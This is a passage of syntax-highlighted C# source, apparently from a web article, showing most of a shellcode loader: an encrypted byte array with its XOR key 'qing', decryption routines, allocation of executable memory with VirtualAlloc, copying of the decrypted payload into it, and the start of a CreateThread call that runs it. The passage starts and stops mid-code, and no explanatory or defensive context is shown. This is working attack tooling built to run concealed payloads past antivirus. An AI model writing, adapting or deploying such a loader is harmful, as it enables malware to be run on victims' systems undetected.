179);">CryptoStream</span>(ms, aes.<span style="color: rgb(0, 134, 179);">CreateDecryptor</span>(), <span style="color: rgb(0, 134, 179);">CryptoStreamMode</span>.<span style="color: rgb(0, 134, 179);">Write</span>))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                        cs.<span style="color: rgb(0, 134, 179);">Write</span>(encryptedMessage, <span style="color: rgb(0, 134, 179);">0</span>, encryptedMessage.<span style="color: rgb(0, 134, 179);">Length</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">return</span> ms.<span style="color: rgb(0, 134, 179);">ToArray</span>();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">//==============================================================================</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">// MAIN FUNCTION</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">//==============================================================================</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">void</span> <span style="color: rgb(0, 134, 179);">Main</span>()</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">byte</span>[] encryptedShellcode = <span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(167, 29, 93);">byte</span>[] { <span style="color: rgb(0, 134, 179);">0x8d</span>,<span style="color: rgb(0, 134, 179);">0x81</span>,<span style="color: rgb(0, 134, 179);">0xec</span>,<span style="color: rgb(0, 134, 179);">0x67</span>,<span style="color: rgb(0, 134, 179);">0x71</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x0e</span>,<span style="color: rgb(0, 134, 179);">0xee</span>,<span style="color: rgb(0, 134, 179);">0x94</span>,<span style="color: rgb(0, 134, 179);">0x58</span>,<span style="color: rgb(0, 134, 179);">0xae</span>,<span style="color: rgb(0, 134, 179);">0x03</span>,<span style="color: rgb(0, 134, 179);">0xfa</span>,<span style="color: rgb(0, 134, 179);">0x39</span>,<span style="color: rgb(0, 134, 179);">0x5e</span>,<span style="color: rgb(0, 134, 179);">0xec</span>,<span style="color: rgb(0, 134, 179);">0x23</span>,<span style="color: rgb(0, 134, 179);">0x65</span>,<span style="color: rgb(0, 134, 179);">0xe5</span>,<span style="color: rgb(0, 134, 179);">0x35</span>,<span style="color: rgb(0, 134, 179);">0x65</span>,<span style="color: rgb(0, 134, 179);">0xe2</span>,<span style="color: rgb(0, 134, 179);">0x1c</span>,<span style="color: rgb(0, 134, 179);">0x4f</span>,<span style="color: rgb(0, 134, 179);">0x7e</span>,<span style="color: rgb(0, 134, 179);">0xde</span>,<span style="color: rgb(0, 134, 179);">0x24</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x40</span>,<span style="color: rgb(0, 134, 179);">0x96</span>,<span style="color: rgb(0, 134, 179);">0xc2</span>,<span style="color: rgb(0, 134, 179);">0x5b</span>,<span style="color: rgb(0, 134, 179);">0x10</span>,<span style="color: rgb(0, 134, 179);">0x15</span>,<span style="color: rgb(0, 134, 179);">0x6c</span>,<span style="color: rgb(0, 134, 179);">0x4b</span>,<span style="color: rgb(0, 134, 179);">0x51</span>,<span style="color: rgb(0, 134, 179);">0xa8</span>,<span style="color: rgb(0, 134, 179);">0xa1</span>,<span style="color: rgb(0, 134, 179);">0x6a</span>,<span style="color: rgb(0, 134, 179);">0x70</span>,<span style="color: rgb(0, 134, 179);">0xae</span>,<span style="color: rgb(0, 134, 179);">0x8c</span>,<span style="color: rgb(0, 134, 179);">0x95</span>,<span style="color: rgb(0, 134, 179);">0x23</span>,<span style="color: rgb(0, 134, 179);">0x3e</span>,<span style="color: rgb(0, 134, 179);">0xe5</span>,<span style="color: rgb(0, 134, 179);">0x35</span>,<span style="color: rgb(0, 134, 179);">0x61</span>,<span style="color: rgb(0, 134, 179);">0xe2</span>,<span style="color: rgb(0, 134, 179);">0x24</span>,<span style="color: rgb(0, 134, 179);">0x5b</span>,<span style="color: rgb(0, 134, 179);">0xfa</span>,<span style="color: rgb(0, 134, 179);">0x25</span>,<span style="color: rgb(0, 134, 179);">0x7f</span>,<span style="color: rgb(0, 134, 179);">0x1f</span>,<span style="color: rgb(0, 134, 179);">0x92</span>,<span style="color: rgb(0, 134, 179);">0x21</span>,<span style="color: rgb(0, 134, 179);">0x6f</span>,<span style="color: rgb(0, 134, 179);">0xb6</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0xe2</span>,<span style="color: rgb(0, 134, 179);">0x37</span>,<span style="color: rgb(0, 134, 179);">0x47</span>,<span style="color: rgb(0, 134, 179);">0x70</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0xe5</span>,<span style="color: rgb(0, 134, 179);">0x2e</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x8a</span>,<span style="color: rgb(0, 134, 179);">0x54</span>,<span style="color: rgb(0, 134, 179);">0x2e</span>,<span style="color: rgb(0, 134, 179);">0xfa</span>,<span style="color: rgb(0, 134, 179);">0x5d</span>,<span style="color: rgb(0, 134, 179);">0xe5</span>,<span style="color: rgb(0, 134, 179);">0x66</span>,<span style="color: rgb(0, 134, 179);">0xa7</span>,<span style="color: rgb(0, 134, 179);">0x58</span>,<span style="color: rgb(0, 134, 179);">0x91</span>,<span style="color: rgb(0, 134, 179);">0xcb</span>,<span style="color: rgb(0, 134, 179);">0xb0</span>,<span style="color: rgb(0, 134, 179);">0xa6</span>,<span style="color: rgb(0, 134, 179);">0x63</span>,<span style="color: rgb(0, 134, 179);">0x66</span>,<span style="color: rgb(0, 134, 179);">0xb6</span>,<span style="color: rgb(0, 134, 179);">0x51</span>,<span style="color: rgb(0, 134, 179);">0x8e</span>,<span style="color: rgb(0, 134, 179);">0x12</span>,<span style="color: rgb(0, 134, 179);">0x87</span>,<span style="color: rgb(0, 134, 179);">0x6a</span>,<span style="color: rgb(0, 134, 179);">0x13</span>,<span style="color: rgb(0, 134, 179);">0x9f</span>,<span style="color: rgb(0, 134, 179);">0x4a</span>,<span style="color: rgb(0, 134, 179);">0x14</span>,<span style="color: rgb(0, 134, 179);">0x4a</span>,<span style="color: rgb(0, 134, 179);">0x12</span>,<span style="color: rgb(0, 134, 179);">0x95</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0xe5</span>,<span style="color: rgb(0, 134, 179);">0x3f</span>,<span style="color: rgb(0, 134, 179);">0x55</span>,<span style="color: rgb(0, 134, 179);">0x68</span>,<span style="color: rgb(0, 134, 179);">0xbd</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xfa</span>,<span style="color: rgb(0, 134, 179);">0x65</span>,<span style="color: rgb(0, 134, 179);">0x25</span>,<span style="color: rgb(0, 134, 179);">0xec</span>,<span style="color: rgb(0, 134, 179);">0x29</span>,<span style="color: rgb(0, 134, 179);">0x75</span>,<span style="color: rgb(0, 134, 179);">0x6f</span>,<span style="color: rgb(0, 134, 179);">0xb4</span>,<span style="color: rgb(0, 134, 179);">0xfa</span>,<span style="color: rgb(0, 134, 179);">0x6d</span>,<span style="color: rgb(0, 134, 179);">0xe5</span>,<span style="color: rgb(0, 134, 179);">0x66</span>,<span style="color: rgb(0, 134, 179);">0xa1</span>,<span style="color: rgb(0, 134, 179);">0xe0</span>,<span style="color: rgb(0, 134, 179);">0x2a</span>,<span style="color: rgb(0, 134, 179);">0x43</span>,<span style="color: rgb(0, 134, 179);">0x55</span>,<span style="color: rgb(0, 134, 179);">0x32</span>,<span style="color: rgb(0, 134, 179);">0x35</span>,<span style="color: rgb(0, 134, 179);">0x06</span>,<span style="color: rgb(0, 134, 179);">0x28</span>,<span style="color: rgb(0, 134, 179);">0x33</span>,<span style="color: rgb(0, 134, 179);">0x3f</span>,<span style="color: rgb(0, 134, 179);">0x98</span>,<span style="color: rgb(0, 134, 179);">0x91</span>,<span style="color: rgb(0, 134, 179);">0x36</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0x3d</span>,<span style="color: rgb(0, 134, 179);">0xfa</span>,<span style="color: rgb(0, 134, 179);">0x7b</span>,<span style="color: rgb(0, 134, 179);">0x85</span>,<span style="color: rgb(0, 134, 179);">0xea</span>,<span style="color: rgb(0, 134, 179);">0x2c</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x5d</span>,<span style="color: rgb(0, 134, 179);">0x55</span>,<span style="color: rgb(0, 134, 179);">0x71</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x06</span>,<span style="color: rgb(0, 134, 179);">0x10</span>,<span style="color: rgb(0, 134, 179);">0x02</span>,<span style="color: rgb(0, 134, 179);">0x5b</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0x33</span>,<span style="color: rgb(0, 134, 179);">0x19</span>,<span style="color: rgb(0, 134, 179);">0x25</span>,<span style="color: rgb(0, 134, 179);">0x19</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x76</span>,<span style="color: rgb(0, 134, 179);">0xe0</span>,<span style="color: rgb(0, 134, 179);">0x86</span>,<span style="color: rgb(0, 134, 179);">0x98</span>,<span style="color: rgb(0, 134, 179);">0xa1</span>,<span style="color: rgb(0, 134, 179);">0xd1</span>,<span style="color: rgb(0, 134, 179);">0xfe</span>,<span style="color: rgb(0, 134, 179);">0x66</span>,<span style="color: rgb(0, 134, 179);">0x71</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x47</span>,<span style="color: rgb(0, 134, 179);">0xa3</span>,<span style="color: rgb(0, 134, 179);">0x25</span>,<span style="color: rgb(0, 134, 179);">0x39</span>,<span style="color: rgb(0, 134, 179);">0x06</span>,<span style="color: rgb(0, 134, 179);">0x4e</span>,<span style="color: rgb(0, 134, 179);">0xf1</span>,<span style="color: rgb(0, 134, 179);">0x02</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x98</span>,<span style="color: rgb(0, 134, 179);">0xa4</span>,<span style="color: rgb(0, 134, 179);">0x03</span>,<span style="color: rgb(0, 134, 179);">0x64</span>,<span style="color: rgb(0, 134, 179);">0x0f</span>,<span style="color: rgb(0, 134, 179);">0xb1</span>,<span style="color: rgb(0, 134, 179);">0xc1</span>,<span style="color: rgb(0, 134, 179);">0xc0</span>,<span style="color: rgb(0, 134, 179);">0xe9</span>,<span style="color: rgb(0, 134, 179);">0x19</span>,<span style="color: rgb(0, 134, 179);">0x6b</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x76</span>,<span style="color: rgb(0, 134, 179);">0x2d</span>,<span style="color: rgb(0, 134, 179);">0xe0</span>,<span style="color: rgb(0, 134, 179);">0x88</span>,<span style="color: rgb(0, 134, 179);">0x37</span>,<span style="color: rgb(0, 134, 179);">0x21</span>,<span style="color: rgb(0, 134, 179);">0x39</span>,<span style="color: rgb(0, 134, 179);">0x3e</span>,<span style="color: rgb(0, 134, 179);">0x27</span>,<span style="color: rgb(0, 134, 179);">0x21</span>,<span style="color: rgb(0, 134, 179);">0x29</span>,<span style="color: rgb(0, 134, 179);">0x3e</span>,<span style="color: rgb(0, 134, 179);">0x0f</span>,<span style="color: rgb(0, 134, 179);">0x9b</span>,<span style="color: rgb(0, 134, 179);">0x66</span>,<span style="color: rgb(0, 134, 179);">0xb1</span>,<span style="color: rgb(0, 134, 179);">0x87</span>,<span style="color: rgb(0, 134, 179);">0x8e</span>,<span style="color: rgb(0, 134, 179);">0xbc</span>,<span style="color: rgb(0, 134, 179);">0xf9</span>,<span style="color: rgb(0, 134, 179);">0x0d</span>,<span style="color: rgb(0, 134, 179);">0x61</span>,<span style="color: rgb(0, 134, 179);">0x3f</span>,<span style="color: rgb(0, 134, 179);">0x39</span>,<span style="color: rgb(0, 134, 179);">0x0f</span>,<span style="color: rgb(0, 134, 179);">0xe8</span>,<span style="color: rgb(0, 134, 179);">0xcc</span>,<span style="color: rgb(0, 134, 179);">0x1a</span>,<span style="color: rgb(0, 134, 179);">0x06</span>,<span style="color: rgb(0, 134, 179);">0x8e</span>,<span style="color: rgb(0, 134, 179);">0xbc</span>,<span style="color: rgb(0, 134, 179);">0xeb</span>,<span style="color: rgb(0, 134, 179);">0xa7</span>,<span style="color: rgb(0, 134, 179);">0x05</span>,<span style="color: rgb(0, 134, 179);">0x63</span>,<span style="color: rgb(0, 134, 179);">0x91</span>,<span style="color: rgb(0, 134, 179);">0x29</span>,<span style="color: rgb(0, 134, 179);">0x79</span>,<span style="color: rgb(0, 134, 179);">0x1c</span>,<span style="color: rgb(0, 134, 179);">0x82</span>,<span style="color: rgb(0, 134, 179);">0x8f</span>,<span style="color: rgb(0, 134, 179);">0x16</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x67</span>,<span style="color: rgb(0, 134, 179);">0x1b</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x04</span>,<span style="color: rgb(0, 134, 179);">0x63</span>,<span style="color: rgb(0, 134, 179);">0x27</span>,<span style="color: rgb(0, 134, 179);">0x3e</span>,<span style="color: rgb(0, 134, 179);">0x06</span>,<span style="color: rgb(0, 134, 179);">0x65</span>,<span style="color: rgb(0, 134, 179);">0xa8</span>,<span style="color: rgb(0, 134, 179);">0xa1</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0x98</span>,<span style="color: rgb(0, 134, 179);">0xa4</span>,<span style="color: rgb(0, 134, 179);">0xea</span>,<span style="color: rgb(0, 134, 179);">0x96</span>,<span style="color: rgb(0, 134, 179);">0x67</span>,<span style="color: rgb(0, 134, 179);">0x0f</span>,<span style="color: rgb(0, 134, 179);">0x5f</span>,<span style="color: rgb(0, 134, 179);">0xe5</span>,<span style="color: rgb(0, 134, 179);">0x51</span>,<span style="color: rgb(0, 134, 179);">0x1b</span>,<span style="color: rgb(0, 134, 179);">0x29</span>,<span style="color: rgb(0, 134, 179);">0x06</span>,<span style="color: rgb(0, 134, 179);">0x67</span>,<span style="color: rgb(0, 134, 179);">0x61</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0x1b</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x06</span>,<span style="color: rgb(0, 134, 179);">0x3f</span>,<span style="color: rgb(0, 134, 179);">0xd5</span>,<span style="color: rgb(0, 134, 179);">0x3a</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x98</span>,<span style="color: rgb(0, 134, 179);">0xa4</span>,<span style="color: rgb(0, 134, 179);">0xfa</span>,<span style="color: rgb(0, 134, 179);">0x3d</span>,<span style="color: rgb(0, 134, 179);">0x0d</span>,<span style="color: rgb(0, 134, 179);">0x71</span>,<span style="color: rgb(0, 134, 179);">0x3f</span>,<span style="color: rgb(0, 134, 179);">0x3d</span>,<span style="color: rgb(0, 134, 179);">0x30</span>,<span style="color: rgb(0, 134, 179);">0x19</span>,<span style="color: rgb(0, 134, 179);">0x6b</span>,<span style="color: rgb(0, 134, 179);">0xb7</span>,<span style="color: rgb(0, 134, 179);">0xaf</span>,<span style="color: rgb(0, 134, 179);">0x2e</span>,<span style="color: rgb(0, 134, 179);">0x96</span>,<span style="color: rgb(0, 134, 179);">0xbb</span>,<span style="color: rgb(0, 134, 179);">0xe4</span>,<span style="color: rgb(0, 134, 179);">0x89</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x13</span>,<span style="color: rgb(0, 134, 179);">0x4f</span>,<span style="color: rgb(0, 134, 179);">0x29</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x27</span>,<span style="color: rgb(0, 134, 179);">0x71</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x04</span>,<span style="color: rgb(0, 134, 179);">0x67</span>,<span style="color: rgb(0, 134, 179);">0x21</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x65</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x7e</span>,<span style="color: rgb(0, 134, 179);">0x59</span>,<span style="color: rgb(0, 134, 179);">0x91</span>,<span style="color: rgb(0, 134, 179);">0xb2</span>,<span style="color: rgb(0, 134, 179);">0x26</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x1b</span>,<span style="color: rgb(0, 134, 179);">0x09</span>,<span style="color: rgb(0, 134, 179);">0x3c</span>,<span style="color: rgb(0, 134, 179);">0x08</span>,<span style="color: rgb(0, 134, 179);">0x91</span>,<span style="color: rgb(0, 134, 179);">0xb2</span>,<span style="color: rgb(0, 134, 179);">0x2f</span>,<span style="color: rgb(0, 134, 179);">0x37</span>,<span style="color: rgb(0, 134, 179);">0x91</span>,<span style="color: rgb(0, 134, 179);">0x6b</span>,<span style="color: rgb(0, 134, 179);">0x55</span>,<span style="color: rgb(0, 134, 179);">0x66</span>,<span style="color: rgb(0, 134, 179);">0xeb</span>,<span style="color: rgb(0, 134, 179);">0x17</span>,<span style="color: rgb(0, 134, 179);">0x8e</span>,<span style="color: rgb(0, 134, 179);">0x96</span>,<span style="color: rgb(0, 134, 179);">0x91</span>,<span style="color: rgb(0, 134, 179);">0x8e</span>,<span style="color: rgb(0, 134, 179);">0xea</span>,<span style="color: rgb(0, 134, 179);">0x96</span>,<span style="color: rgb(0, 134, 179);">0x91</span>,<span style="color: rgb(0, 134, 179);">0x98</span>,<span style="color: rgb(0, 134, 179);">0x70</span>,<span style="color: rgb(0, 134, 179);">0xaa</span>,<span style="color: rgb(0, 134, 179);">0x47</span>,<span style="color: rgb(0, 134, 179);">0xa1</span>,<span style="color: rgb(0, 134, 179);">0x04</span>,<span style="color: rgb(0, 134, 179);">0xa8</span>,<span style="color: rgb(0, 134, 179);">0xad</span>,<span style="color: rgb(0, 134, 179);">0xdc</span>,<span style="color: rgb(0, 134, 179);">0x81</span>,<span style="color: rgb(0, 134, 179);">0xdc</span>,<span style="color: rgb(0, 134, 179);">0xcc</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0x1b</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x3d</span>,<span style="color: rgb(0, 134, 179);">0x98</span>,<span style="color: rgb(0, 134, 179);">0xa4</span> };</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">string</span> key = <span style="color: rgb(24, 54, 145);">"qing"</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">string</span> cipherType = <span style="color: rgb(24, 54, 145);">"xor"</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">byte</span>[] shellcode = <span style="color: rgb(167, 29, 93);">null</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">//--------------------------------------------------------------</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// Decrypt the shellcode</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">if</span> (cipherType == <span style="color: rgb(24, 54, 145);">"xor"</span>) {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                shellcode = xor(encryptedShellcode, <span style="color: rgb(0, 134, 179);">Encoding</span>.ASCII.<span style="color: rgb(0, 134, 179);">GetBytes</span>(key));</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">else</span> <span style="color: rgb(167, 29, 93);">if</span> (cipherType == <span style="color: rgb(24, 54, 145);">"aes"</span>) {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                shellcode = aesDecrypt(encryptedShellcode, <span style="color: rgb(0, 134, 179);">Convert</span>.<span style="color: rgb(0, 134, 179);">FromBase64String</span>(key));</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">//--------------------------------------------------------------            </span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// Copy decrypted shellcode to memory</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> funcAddr = <span style="color: rgb(0, 134, 179);">VirtualAlloc</span>(<span style="color: rgb(0, 134, 179);">0</span>, (<span style="color: rgb(0, 134, 179);">UInt32</span>)shellcode.<span style="color: rgb(0, 134, 179);">Length</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">Marshal</span>.<span style="color: rgb(0, 134, 179);">Copy</span>(shellcode, <span style="color: rgb(0, 134, 179);">0</span>, (<span style="color: rgb(0, 134, 179);">IntPtr</span>)(funcAddr), shellcode.<span style="color: rgb(0, 134, 179);">Length</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> hThread = <span style="color: rgb(0, 134, 179);">IntPtr</span>.<span style="color: rgb(0, 134, 179);">Zero</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> threadId = <span style="color: rgb(0, 134, 179);">0</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// Prepare data</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> pinfo = <span style="color: rgb(0, 134, 179);">IntPtr</span>.<span style="color: rgb(0, 134, 179);">Zero</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// Invoke the shellcode</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            hThread = <span style="color: rgb(0, 134, 179);">CreateThread</span>(<span style="color: rgb(0, 134, 